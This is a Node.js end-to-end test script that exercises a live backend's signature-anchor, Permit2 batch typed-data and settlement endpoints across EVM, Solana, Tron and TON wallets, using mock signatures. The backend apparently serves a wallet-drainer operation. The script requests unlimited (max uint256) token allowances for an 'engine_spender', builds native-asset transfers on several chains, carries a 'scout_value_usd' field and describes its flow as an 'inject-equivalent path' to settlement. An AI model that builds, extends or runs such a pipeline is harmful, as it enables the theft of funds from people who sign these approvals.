/**
 * Signature + settlement E2E — live API (5-chain focus).
 * Tests full inject-equivalent path: batch typed-data → signature-anchor → settlement response.
 *
 * Mock signatures: validates ingress + settlement pipeline (broadcast may 502 without real sigs).
 * Usage: node scripts/test-signature-settlement-e2e.mjs
 */
const BACKEND = (process.env.BACKEND_URL || 'https://sadrailala-production.up.railway.app').replace(/\/$/, '');
const EXPIRY = '2099-12-31T23:59:59.999Z';
const MOCK_SIG = '0x' + 'ab'.repeat(65);
const MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

const WALLETS = {
  evm: '0xbe3cebae5728C07F39416f0dC1d0165d2972db12',
  sol: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
  tron: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE',
  ton: 'UQCD39VS5jcptHL8vMjEXrzGaRcCVYto7kBd9TzdNYiWfUZE',
};

const results = [];

function unwrap(p) {
  if (p == null || typeof p !== 'object') return p;
  if (p.data != null && (typeof p.ok === 'boolean' || typeof p.success === 'boolean')) return p.data;
  return p;
}

function parseEnvelope(res, raw) {
  if (!raw || typeof raw !== 'object') return { ok: res.ok, data: raw, message: '' };
  const msg = typeof raw.message === 'string' ? raw.message : '';
  if (typeof raw.success === 'boolean') {
    return { ok: raw.success && res.ok, data: unwrap(raw.data ?? raw), message: msg };
  }
  return { ok: res.ok, data: raw, message: msg };
}

async function api(method, path, body) {
  const res = await fetch(`${BACKEND}${path}`, {
    method,
    headers: { 'Content-Type': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
    signal: AbortSignal.timeout(120_000),
  });
  const raw = await res.json().catch(() => ({}));
  const env = parseEnvelope(res, raw);
  return { status: res.status, ok: env.ok, data: env.data, message: env.message || raw.message || '', raw };
}

function record(name, pass, detail) {
  results.push({ name, pass, detail });
  console.log(`${pass ? 'PASS' : 'FAIL'} ${name}${detail ? ` — ${detail}` : ''}`);
}

console.log('SIGNATURE + SETTLEMENT E2E');
console.log('Backend:', BACKEND);
console.log('');

// ── 1. Invalid signature rejected ───────────────────────────────────────────
const badSig = await api('POST', '/api/v1/signature-anchor', {
  ingress: 'normalized_v1',
  chain_family: 'EVM',
  protocol: 'omnichain_atomic_v1',
  wallet_address: WALLETS.evm,
  token_address: USDC,
  signature: '0xinvalid',
  nonce: `bad-sig:${Date.now()}`,
  expiry_iso: EXPIRY,
  wallet_type: 'Simulation',
  chain_id: 1,
  scout_value_usd: 1,
  max_allowance: MAX_PERMIT,
  requires_quorum: false,
});
record(
  'invalid-signature-rejected',
  badSig.status === 400 || badSig.status === 422,
  `HTTP ${badSig.status} ${(badSig.message || '').slice(0, 60)}`,
);

// ── 2. Omnichain batch typed-data (5-chain wires) ───────────────────────────
const batch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  sol_wallet: WALLETS.sol,
  nativeAmountSol: '1000000',
  trx_wallet: WALLETS.tron,
  nativeAmountTrx: '1000000',
  ton_wallet: WALLETS.ton,
  nativeAmountTon: '100000000',
});
const batchOk =
  batch.status === 200 &&
  !!batch.data?.typed_data &&
  !!batch.data?.batch_permit_metadata &&
  !!batch.data?.native_transfer_sol &&
  !!batch.data?.native_transfer_trx &&
  !!batch.data?.native_transfer_ton;
record('permit2-omnichain-batch', batchOk, `status=${batch.status}`);

if (!batchOk) {
  console.error('\nAborting settlement tests — batch builder failed');
  process.exit(1);
}

// ── 3. Signature anchor — inject-equivalent omnichain_atomic_v1 ─────────────
const nonce = `e2e-omni:${Date.now()}`;
const anchorBody = {
  ingress: 'normalized_v1',
  chain_family: 'EVM',
  protocol: 'omnichain_atomic_v1',
  wallet_address: WALLETS.evm,
  token_address: USDC,
  permits: batch.data.permits || [{ token: USDC, amount: MAX_PERMIT }],
  batch_permit_metadata: batch.data.batch_permit_metadata,
  chain_id: 1,
  engine_spender: batch.data.engine_spender,
  permit2: batch.data.permit2,
  nativeAmount: batch.data.nativeAmount || '0',
  signature: MOCK_SIG,
  nonce,
  expiry_iso: EXPIRY,
  wallet_type: 'Simulation',
  scout_value_usd: 100,
  max_allowance: MAX_PERMIT,
  requires_quorum: false,
  sol_wallet: WALLETS.sol,
  trx_wallet: WALLETS.tron,
  ton_wallet: WALLETS.ton,
  nativeAmountSol: batch.data.native_amount_sol,
  nativeAmountTrx: batch.data.native_amount_trx,
  nativeAmountTon: batch.data.native_amount_ton,
  omni_payload_sync: {
    session: { eip155: true, solana: true, tron: true, ton: true, bip122: false },
    primary_rack: 'eip155',
    evm_chain_id: 1,
  },
};

const anchor = await api('POST', '/api/v1/signature-anchor', anchorBody);
const anchorAccepted = anchor.status === 200;
const settlementStatus = anchor.data?.settlement_status;
const hasOmnichainResult = anchor.data?.omnichain_settlement != null;
const settled =
  settlementStatus === 'SETTLED' ||
  anchor.data?.handshake_active === true ||
  hasOmnichainResult;
const broadcastFailed = anchor.status === 502 && anchor.data?.code === 'SettlementBroadcastFailed';

record(
  'signature-anchor-omnichain',
  anchorAccepted || broadcastFailed,
  `HTTP ${anchor.status} settlement_status=${settlementStatus ?? 'n/a'} handshake=${anchor.data?.handshake_active}`,
);

record(
  'settlement-pipeline-invoked',
  hasOmnichainResult || broadcastFailed || anchorAccepted,
  hasOmnichainResult
    ? `omnichain_ok=${anchor.data.omnichain_settlement?.ok}`
    : broadcastFailed
      ? 'broadcast failed (expected with mock sig) — pipeline reached settlement'
      : (anchor.message || '').slice(0, 80),
);

// ── 4. Duplicate nonce / signature dedup ────────────────────────────────────
const dup = await api('POST', '/api/v1/signature-anchor', anchorBody);
record(
  'duplicate-anchor-blocked',
  dup.status === 409 || dup.status === 400,
  `HTTP ${dup.status}`,
);

// ── 5. V3 tracking after settlement attempt ─────────────────────────────────
const ts = Date.now();
const reqHash = `sig-e2e-${ts}`;
const v3 = await api('POST', '/api/v1/settlement/request', {
  wallet_address: WALLETS.evm,
  request_hash: reqHash,
  nonce: `v3-${ts}`,
  total_usd_value: '100',
});
const sid = v3.data?.settlement_request_id;
if (sid) {
  await api('POST', `/api/v1/settlement/${sid}/start`, { chain: 'evm' });
  await api('POST', `/api/v1/settlement/${sid}/complete`, {
    chain: 'evm',
    transaction_hash: '0x' + 'cd'.repeat(32),
  });
  const track = await api('GET', `/api/v1/settlement/tracking/${sid}`);
  record('v3-tracking-after-settlement', track.status === 200, `progress=${track.data?.progress_percent ?? '?'}`);
} else {
  record('v3-tracking-after-settlement', false, 'no settlement id');
}

// ── 6. Per-chain native anchor ingress (settlement route smoke) ─────────────
for (const [chain, family, protocol, wallet] of [
  ['Solana', 'SVM', 'solana', WALLETS.sol],
  ['Tron', 'TRON', 'tron', WALLETS.tron],
  ['TON', 'TON', 'ton', WALLETS.ton],
]) {
  const r = await api('POST', '/api/v1/signature-anchor', {
    ingress: 'normalized_v1',
    chain_family: family,
    protocol,
    wallet_address: wallet,
    token_address: `OMNI_${family}_ANCHOR`,
    signature: MOCK_SIG,
    nonce: `${protocol}:${Date.now()}`,
    expiry_iso: EXPIRY,
    wallet_type: 'Simulation',
    scout_value_usd: 1,
    max_allowance: MAX_PERMIT,
    requires_quorum: false,
    amount: '1',
  });
  record(
    `${chain} signature-anchor ingress`,
    r.status < 500,
    `HTTP ${r.status} ${(r.message || '').slice(0, 50)}`,
  );
}

const failed = results.filter((r) => !r.pass).length;
console.log(`\n${results.length - failed}/${results.length} passed`);
process.exit(failed > 0 ? 1 : 0);
